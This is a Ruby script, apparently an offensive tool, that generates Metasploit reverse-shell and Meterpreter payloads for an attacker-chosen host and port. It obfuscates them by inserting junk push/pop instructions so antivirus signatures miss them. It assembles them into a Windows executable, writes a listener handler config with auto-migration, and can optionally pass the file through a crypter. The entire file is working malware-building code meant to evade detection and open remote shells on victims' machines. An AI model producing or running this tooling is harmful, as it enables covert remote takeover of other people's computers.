#!/usr/bin/env ruby
require 'metasm'
include Metasm

#Filenames, feel free to change
raw_file = "raw_binary"
exe_file = "ghost.exe"
asm_ghost = "asm_ghost.asm"
exe_crypt_file = "ghost-crypt.exe" #Only used at the end if you use crypter.exe.

header = ".section '.text' rwx\n.entrypoint\n"

#Setting the random options

random_push = ["push edi\npop edi\n", "push eax\npop eax\n", "push ebx\npop ebx\n", "push ecx\npop ecx\n", "push edx\npop edx\n"]
random_pop = ["push edi\npop edi\n", "push eax\npop eax\n", "push ebx\npop ebx\n", "push ecx\npop ecx\n", "push edx\npop edx\n"]
random_xor = ["push edi\npop edi\n", "push eax\npop eax\n", "push ebx\npop ebx\n", "push ecx\npop ecx\n", "push edx\npop edx\n"]


#Picking which options to use this time
#replace1
org1 = "push eax"
new1 = "push eax\n"+random_push.sample+"\n"
#replace2
org2 = "push ebx"
new2 = "push ebx\n"+random_push.sample+"\n"
#replace3
org3 = "push ecx"
new3 = "push ecx\n"+random_push.sample+"\n"
#replace4
org4 = "push edx"
new4 = "push edx\n"+random_push.sample+"\n"
#replace5
org5 = "pop eax"
new5 = "pop eax\n"+random_pop.sample+"\n"
#replace6
org6 = "pop ebx"
new6 = "pop ebx\n"+random_pop.sample+"\n"
#replace7
org7 = "pop ecx"
new7 = "pop ecx\n"+random_pop.sample+"\n"
#replace8
org8 = "pop edx"
new8 = "pop edx\n"+random_pop.sample+"\n"
#replace9
org9 = "pop edi"
new9 = "pop edi\n"+random_pop.sample+"\n"
#replace10
org10 = "pop ebp"
new10 = "pop ebp\n"+random_pop.sample+"\n"
#replace11
org11 = "xor eax, eax"
new11 = "\n"+random_xor.sample + "\nxor eax, eax"
#replace12
org12 = "xor ebx, ebx"
new12 = "\n"+random_xor.sample + "\nxor ebx, ebx"
#replace13
org13 = "xor ecx, ecx"
new13 = "\n"+random_xor.sample + "\nxor ecx, ecx"
#replace14
org14 = "xor edx, edx"
new14 = "\n"+random_xor.sample + "\nxor edx, edx"
#replace15
org15 = "xor edi, edi"
new15 = "\n"+random_xor.sample + "\nxor edi, edi"

#Deleting exe and asm files if already exist
File.delete(exe_file) if File.file?(exe_file)
File.delete(asm_ghost) if File.file?(asm_ghost)

#User input
puts "**************************************"
puts "1) windows/shell/reverse_tcp"
puts "2) windows/meterpreter/reverse_tcp"
puts "3) windows/meterpreter/reverse_https"
puts "4) windows/meterpreter/reverse_http"
puts "5) Custom payload (raw msfpayload file)"
puts "6) Obfuscate ASM file only"
puts "**************************************"
puts "Select a payload (1-6):"
PAYLOAD = gets.chomp
payload_num = PAYLOAD.to_i
if payload_num < 5
  puts "Enter LHOST IP"
  print "ip = "
  LHOST = gets.chomp
  puts "Enter LPORT"
  print "LPORT = "
  LPORT = gets.chomp
end

#Making raw payload or getting the file
case PAYLOAD
  when "1"
  payload_name = "windows/shell/reverse_tcp"
  when "2"
  payload_name = "windows/meterpreter/reverse_tcp"
  when "3"
  payload_name = "windows/meterpreter/reverse_https"
  when "4"
  payload_name = "windows/meterpreter/reverse_http"
  when "5"
  puts "Enter filename."
  user_file = gets.chomp
  if File.file?(user_file)
      raw_file = user_file
    else
      puts "File not found, please try again."
      exit
  end
  when "6"
  puts " Enter existing asm filename"
  user_file = gets.chomp
  if File.file?(user_file)
      asm_string = File.read(user_file)
    else
      puts "File not found, please try again."
      exit
  end
  else
  puts "Please select 1-6 only."
  exitrandom
end

if payload_num < 5
    #Making payload
  %x{msfpayload #{payload_name} LHOST=#{LHOST} LPORT=#{LPORT} R > #{raw_file}}
  #Making the rc file
  rc = File.new("obfy.rc", "w+")
  rc.puts "use exploit/multi/handler"
  rc.puts "set payload #{payload_name}"
  rc.puts "set LHOST #{LHOST}"
  rc.puts "set LPORT #{LPORT}"
  rc.puts "set SessionCommunicationTimeout 600"
  rc.puts "set ExitOnSession false"
  rc.puts "set InitialAutoRunScript migrate -f"
  rc.puts "set PrependMigrate true"
  rc.puts "exploit -j -z"
  rc.close
end

unless payload_num == 6
  #Converting it to the asm code
  raw = File.open(raw_file, 'rb')
  exefmt =  AutoExe.orshellcode { Metasm.const_get('Ia32').new }
  exe = exefmt.decode_file(raw)
  asm_text = exe.send('disassemble')
  #Adding the header, if needed.
  asm_string = asm_text.to_s
  unless asm_string.index('.entrypoint') then
    asm_string = header + asm_text.to_s
  end
end
#Doing the ghost writing
replace1 = asm_string.gsub("#{org1}", "#{new1}") 
replace2 = replace1.gsub("#{org2}", "#{new2}") 
replace3 = replace2.gsub("#{org3}", "#{new3}") 
replace4 = replace3.gsub("#{org4}", "#{new4}") 
replace5 = replace4.gsub("#{org5}", "#{new5}") 
replace6 = replace5.gsub("#{org6}", "#{new6}") 
replace7 = replace6.gsub("#{org7}", "#{new7}") 
replace8 = replace7.gsub("#{org8}", "#{new8}") 
replace9 = replace8.gsub("#{org9}", "#{new9}") 
replace10 = replace9.gsub("#{org10}", "#{new10}") 
replace11 = replace10.gsub("#{org11}", "#{new11}") 
replace12 = replace11.gsub("#{org12}", "#{new12}") 
replace13 = replace12.gsub("#{org13}", "#{new13}") 
replace14= replace13.gsub("#{org14}", "#{new14}") 
replace15 = replace14.gsub("#{org15}", "#{new15}") 
File.open(asm_ghost, "w") {|file| file.puts replace15}

unless payload_num == 6
  #Making the exe
  src = File.read(asm_ghost)
  exe = Metasm::PE.assemble(Metasm::Ia32.new, src, asm_ghost)
  exe.encode_file(exe_file, :bin)
  if payload_num == 5
    puts "#{exe_file} was created."
  else
    puts "#{exe_file} was created, payload =#{payload_name}, LHOST=#{LHOST}, and LPORT=#{LPORT}"
  end
  #Cleaning up
  File.delete(asm_ghost) if File.file?(asm_ghost)
  File.delete(raw_file) if File.file?(raw_file)
    #Checking if crypter is installed and if so, offering to use it on the file
  crypterpath = %x{locate -l 1 crypter.exe}.sub("crypter.exe", "").chomp
  unless crypterpath.empty?
    puts "Crypter was detected, do you want to use it on the new executable? Y/N"
    crypt = gets.chomp
    case crypt
    when "Y", "y", "Yes", "yes"
      exedir = Dir.pwd
      Dir.chdir crypterpath
      %x{wine crypter.exe #{exedir}"/"#{exe_file} #{exedir}"/"#{exe_crypt_file}}
      puts "#{exe_crypt_file} was created as well, enjoy."
    else
      puts "Not using crypter."
    end
  else
    puts "Crypter not detected, if you have it run updatedb so the script can locate it."
  end
else
  puts "New file #{asm_ghost} created."
end
